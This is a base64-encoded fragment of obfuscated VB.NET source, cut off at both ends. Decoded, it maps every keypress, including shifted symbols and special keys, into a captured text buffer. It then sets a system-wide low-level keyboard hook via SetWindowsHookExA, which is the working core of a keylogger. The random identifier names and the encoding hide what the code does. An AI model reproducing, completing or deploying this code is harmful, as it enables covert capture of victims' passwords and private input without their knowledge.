CAgICAgWzU0XS5UZXh0ICs9ICIiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5MZWZ0IFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIiINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLlJpZ2h0IFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIiINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLlRhYiBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICJbVEFCXSINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkVuZCBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICJbRU5EXSINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkVzY2FwZSBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICJbRVNDXSINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkRpdmlkZSBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICIvIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuRGVjaW1hbCBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICIuIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuU3VidHJhY3QgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiLSINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkFkZCBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICIrIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuTXVsdGlwbHkgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiKiINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkNvbnRyb2xLZXkgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiW0NUUkxdIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuQWx0IFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIltBTFRdIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuUGFnZVVwIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIltQYWdlIFVwXSINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLlBhZ2VEb3duIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIltQYWdlIERvd25dIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuSG9tZSBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICJbSG9tZV0iDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5JbnNlcnQgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiW0luc2VydF0iDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5FbmQgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiW0VuZF0iDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5Fc2NhcGUgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiW0VzY10iDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5QcmludFNjcmVlbiBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICJbUHJ0IFNjcmVlbl0iDQogICAgICAgICAgICBFbmQgSWYNCiAgICAgICAgRWxzZUlmIE15LkNvbXB1dGVyLktleWJvYXJkLlNoaWZ0S2V5RG93biA9IFRydWUgQW5kIE15LkNvbXB1dGVyLktleWJvYXJkLkNhcHNMb2NrID0gRmFsc2UgVGhlbg0KICAgICAgICAgICAgSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5EMSBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICIhIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuRDIgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiQCINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkQzIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIiMiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5ENCBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICIkIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuRDUgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiJSINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkQ2IFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIl4iDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5ENyBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICImIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuRDggVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiKiINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkQ5IFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIigiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5EMCBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICIpIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuQSBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICJBIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuQiBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICJCIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuQyBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICJDIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuRCBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICJEIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuRSBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICJFIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuRiBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICJGIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuRyBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICJHIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuSCBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICJIIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuSSBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICJJIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuSiBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICJKIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuSyBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICJLIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuTCBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICJMIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuTSBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICJNIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuTiBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICJOIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuTyBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICJPIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuUCBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICJQIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuUSBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICJRIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuUiBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICJSIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuUyBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICJTIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuVCBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICJUIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuVSBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICJVIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuViBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICJWIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuVyBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICJXIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuWCBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICJYIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuWSBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICJZIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuWiBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICJaIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuT2VtY29tbWEgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiPCINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLk9lbU1pbnVzIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIl8iDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5PZW1PcGVuQnJhY2tldHMgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAieyINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLk9lbUNsb3NlQnJhY2tldHMgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAifSINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLk9lbVF1ZXN0aW9uIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIj8iDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5PZW1QaXBlIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gInwiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5PZW0xIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIjoiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5PZW1QZXJpb2QgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiPiINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLk9lbXRpbGRlIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIn4iDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5TcGFjZSBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICIgIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuRW50ZXIgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSB2Yk5ld0xpbmUNCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkYxIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIltGMV0iDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5GMiBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICJbRjJdIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuRjMgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiW0YzXSINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkY0IFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIltGNF0iDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5GNSBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICJbRjVdIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuRjYgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiW0Y2XSINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkY3IFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIltGN10iDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5GOCBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICJbRjhdIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuRjkgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiW0Y5XSINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkYxMCBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICJbRjEwXSINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkYxMSBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICJbRjExXSINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkYxMiBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICJbRjEyXSINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkRlbGV0ZSBUaGVuDQogICAgICAgICAgICAgICAgSWYgTm90IFs1NF0uVGV4dC5FbmRzV2l0aCh2Yk5ld0xpbmUpIFRoZW4NCiAgICAgICAgICAgICAgICAgICAgSWYgTm90IFs1NF0uVGV4dC5FbmRzV2l0aCgifCIpIFRoZW4NCiAgICAgICAgICAgICAgICAgICAgICAgIElmIE5vdCBbNTRdLlRleHQuRW5kc1dpdGgoIl0iKSBUaGVuDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgWzU0XS5UZXh0ID0gWzU0XS5UZXh0LlN1YnN0cmluZygwLCBbNTRdLlRleHQuTGVuZ3RoIC0gMSkNCiAgICAgICAgICAgICAgICAgICAgICAgIEVuZCBJZg0KICAgICAgICAgICAgICAgICAgICBFbmQgSWYNCiAgICAgICAgICAgICAgICBFbmQgSWYNCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkJhY2sgVGhlbg0KICAgICAgICAgICAgICAgIElmIE5vdCBbNTRdLlRleHQuRW5kc1dpdGgodmJOZXdMaW5lKSBUaGVuDQogICAgICAgICAgICAgICAgICAgIElmIE5vdCBbNTRdLlRleHQuRW5kc1dpdGgoInwiKSBUaGVuDQogICAgICAgICAgICAgICAgICAgICAgICBJZiBOb3QgWzU0XS5UZXh0LkVuZHNXaXRoKCJdIikgVGhlbg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIFs1NF0uVGV4dCA9IFs1NF0uVGV4dC5TdWJzdHJpbmcoMCwgWzU0XS5UZXh0Lkxlbmd0aCAtIDEpDQogICAgICAgICAgICAgICAgICAgICAgICBFbmQgSWYNCiAgICAgICAgICAgICAgICAgICAgRW5kIElmDQogICAgICAgICAgICAgICAgRW5kIElmDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5Eb3duIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIiINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLlVwIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIiINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkxlZnQgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuUmlnaHQgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuVGFiIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIltUQUJdIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuRW5kIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIltFTkRdIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuRXNjYXBlIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIltFU0NdIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuRGl2aWRlIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIi8iDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5EZWNpbWFsIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIi4iDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5TdWJ0cmFjdCBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICItIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuQWRkIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIisiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5NdWx0aXBseSBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICIqIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuT2VtUXVvdGVzIFRoZW4NCiAgICAgICAgICAgICAgICAnWzU0XS50ZXh0ICs9ICpxdW90ZSoNCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkNvbnRyb2xLZXkgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiW0NUUkxdIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuQWx0IFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIltBTFRdIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuUGFnZVVwIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIltQYWdlIFVwXSINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLlBhZ2VEb3duIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIltQYWdlIERvd25dIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuSG9tZSBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICJbSG9tZV0iDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5JbnNlcnQgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiW0luc2VydF0iDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5FbmQgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiW0VuZF0iDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5Fc2NhcGUgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiW0VzY10iDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5QcmludFNjcmVlbiBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICJbUHJ0IFNjcmVlbl0iDQogICAgICAgICAgICBFbmQgSWYNCiAgICAgICAgRW5kIElmDQoNCiAgICBFbmQgU3ViDQoNCg0KICAgICBGcmllbmQgQ2xhc3MgaVRZVUxTeWNGZ1BjRGJEZEgNCiAgICAgICAgUHJpdmF0ZSBDb25zdCBaZE5CQVdPbm9JVVN6clFyeCBBcyBJbnRlZ2VyID0gMA0KICAgICAgICBQcml2YXRlIENvbnN0IG5qQndPVUVlS2tOaHpremZZIEFzIEludGVnZXIgPSAxMw0KICAgICAgICBQcml2YXRlIENvbnN0IExnVFROQ2ZGSmNJUVFpQmFZID0gJkgxMDANCiAgICAgICAgUHJpdmF0ZSBDb25zdCBQdU9ISmJ5UVR0dmlva05ZaCA9ICZIMTAxDQogICAgICAgIFByaXZhdGUgQ29uc3Qgdm50bmJWZ3BRbFdjZ3RJekUgPSAmSDEwNA0KICAgICAgICBQcml2YXRlIENvbnN0IEF2WXhydW9vSmdvckxTV0dOV3RVa2hQY3hzID0gJkgxMDUNCg0KICAgICAgICBGcmllbmQgU3RydWN0dXJlIEFvY1VSSGlrd0pDamRWYXZ6a0JUV2laZUdLDQogICAgICAgICAgICBQdWJsaWMgZlZuS2NkWVJuT0p0cHVyRVZkbFptZFN0aUIgQXMgSW50ZWdlcg0KICAgICAgICAgICAgUHVibGljIERGTmZPVUJ2ckFwZlV6V1hFVkpjSlRicmV6IEFzIEludGVnZXINCiAgICAgICAgICAgIFB1YmxpYyB2eklhYm9CaHJGS2ZHQU5nblhDUVpUdkZIWiBBcyBJbnRlZ2VyDQogICAgICAgICAgICBQdWJsaWMgb0pPWERKSm1IUnBqblpBeEJRTmJKanlBVFMgQXMgSW50ZWdlcg0KICAgICAgICAgICAgUHVibGljIEZKQ3JEZGhyWE5nRWxzc2lZVFN5c0luaERqIEFzIEludGVnZXINCiAgICAgICAgRW5kIFN0cnVjdHVyZQ0KDQogICAgICAgIFByaXZhdGUgRGVjbGFyZSBGdW5jdGlvbiBGcnJSa3ZXSG5rdGNUSlRPRnZHS0wgTGliICJ1c2VyMzIiIF8NCiAgICAgICAgQWxpYXMgIlNldFdpbmRvd3NIb29rRXhBIiBfDQogICAgICAgIChCeVZhbCBCY0dGWXpUT1R0RHRva2J2U3JaZnJKZWlQZyBBcyBJbnRlZ2VyLCBfDQogICAgICAgIEJ5VmFsIERzZFFVWXVWeGxyWlFjQ2ZSckZuRXhvSGRzIEFzIGVPWmx1dkp6dkpiS1FwaHlCaFVqUywgXw0KICAgICAgICBCeVZhbCBrdkhpYkRUSmh0VVFMbElwWHpGcFFlSkRqdiBBcyBJbnRlZ2VyLCBfDQogICAgICAgIEJ5VmFsIFd3T0J5SnJCTkxMYXBCTFppb2dla1pmTER5IEFzIEludGVnZXIpIEFzIEludGVnZXINCg0KICAgICAgICBQcml2YXRlIERlbGVnYXRlIEZ1bmN0aW9uIGVPWmx1dkp6dkpiS1FwaHlCaFVqUyBfDQogICAgICAgIChCeVZhbCBmZHRHRmt2TkxRRGxvWFdHVWxCempkSlp1WCBBcyBJbnRlZ2VyLCBfDQogICAgICAgIEJ5VmFsIFVaSmtFRG9HdkV0ckROd09WaXhRWnBET2RyIEFzIEludGVnZXIsIF8NCiAgICAgICAgQnlSZWYgWFFQdHdWc1picGhKU2dsQVN2WWFWZ3drWXggQXMgQW9jVVJIaWt3SkNqZFZhdnprQlRXaVplR0spIEFzIEludGVnZXINCg0KDQogICAgICAgIFB1YmxpYyBTaGFyZWQgRXZlbnQgZ1ZyU3lLZ1hyWVFBYkREdFRRR3ZCbyhCeVZhbCBJSEthcmZzQmFPWGdnSkp4b1RpZ1NQblJkdyBBcyBLZXlzKQ0KICAgICAgICBQdWJsaWMgU2hhcmVkIEV2ZW50IFBMSFFOU3BPaEFIY3lVdVBqeUlFVEQoQnlWYWwgSUhLYXJmc0JhT1hnZ0pKeG9UaWdTUG5SZHcgQXMgS2V5cykNCg0KICAgICAgICBGcmllbmQgU2hhcmVkIENzb0tGa1NKeFR6V21USmtnQWdwcGYgQXMgSW50ZWdlcg0KDQogICAgICAgIFByaXZhdGUgU2hhcmVkIHBXQmNqUGRMa3JWZ1BOeHpuS2dBSm4gQXMgZU9abHV2Snp2SmJLUXBoeUJoVWpTDQoNCiAgICAgICAgUHVibGljIFN1YiBOZXcoKQ0KICAgICAgICAgICAgcFdCY2pQZExrclZnUE54em5LZ0FKbiA9IE5ldyBlT1psdXZKenZKYktRcGh5QmhValMoQWRkcmVzc09mIGlzZk53a0toa29rbUNlSnRJTEpjSnApDQogICAgICAgICAgICBDc29LRmtTSnhUeldtVEprZ0FncHBmID0gRnJyUmt2V0hua3RjVEpUT0Z2R0tMKG5qQndPVUVlS2tOaHpremZZLCBwV0JjalBkTGtyVmdQTnh6bktnQUpuLCBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbC5HZXRISU5TVEFOQ0UoU3lzdGVtLlJlZmxlY3Rpb24uQXNzZW1ibHkuR2V0RXhlY3V0aW5nQXNzZW1ibHkuR2V0TW9kdWxlcygpKDApKS5Ub0l